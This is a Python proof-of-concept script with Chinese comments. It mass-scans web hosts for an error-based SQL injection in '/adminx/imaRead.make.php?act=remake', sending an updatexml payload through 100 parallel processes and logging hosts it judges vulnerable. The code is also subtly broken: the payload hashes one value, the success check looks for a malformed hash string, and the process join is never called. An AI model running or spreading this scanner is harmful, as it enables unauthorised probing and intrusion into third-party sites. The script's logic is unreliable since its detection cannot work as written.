import requests
import argparse
from multiprocessing import Pool
from urllib.parse import urljoin

# 关闭SSL警告
requests.packages.urllib3.disable_warnings()

def POC(url):
    origin_url = url
    url = url.replace("http://", "")
    url = url.replace("https://", "")
    headers = {
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/json; charset=UTF-8"
}

# json参数，不再用data
    json_data = {
        "feeItem": [1, " AND updatexml(1,concat(0x7e,md5(12345678)),1)"]
    }

    payload = "feeItem[]=1 AND updatexml(1,concat(0x7e,md5(123456)),1)"


    # proxies = {
    #     "http": "http://127.0.0.1:7897",
    #     "https": "http://127.0.0.1:7897"
    
    target = origin_url.rstrip("/") + "/adminx/imaRead.make.php?act=remake"
    try:
        response = requests.post(url=target, headers=headers, json=json_data, timeout=5, verify=False)
        if "e10adc39499ba59abbe56e057f20f883e" in response.text:
            print(f"[+] 存在漏洞的url为: {origin_url}")
            with open("存在漏洞的url.txt", "a+", encoding="utf-8") as f:
                f.write(origin_url + " 存在漏洞\n")
        else:
            print(f"[-] 不存在漏洞的url为: {origin_url}")

    except requests.RequestException as e:
        print(f"[-] 请求异常: {e}")

def main():
    # banner = """

    # """
    parse = argparse.ArgumentParser(description="输入-u检测单个url，-f检测文件中的url")
    parse.add_argument("-u", "--url", type=str, help="输入单个url")
    parse.add_argument("-f", "--file", type=str, help="输入url文件")
    args = parse.parse_args()

    if args.url:
        POC(args.url)
    elif args.file:
        with open(args.file, 'r') as f:
            url_list = []
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(POC, url_list)
        mp.close()
        mp.join


if __name__ == "__main__":
    main()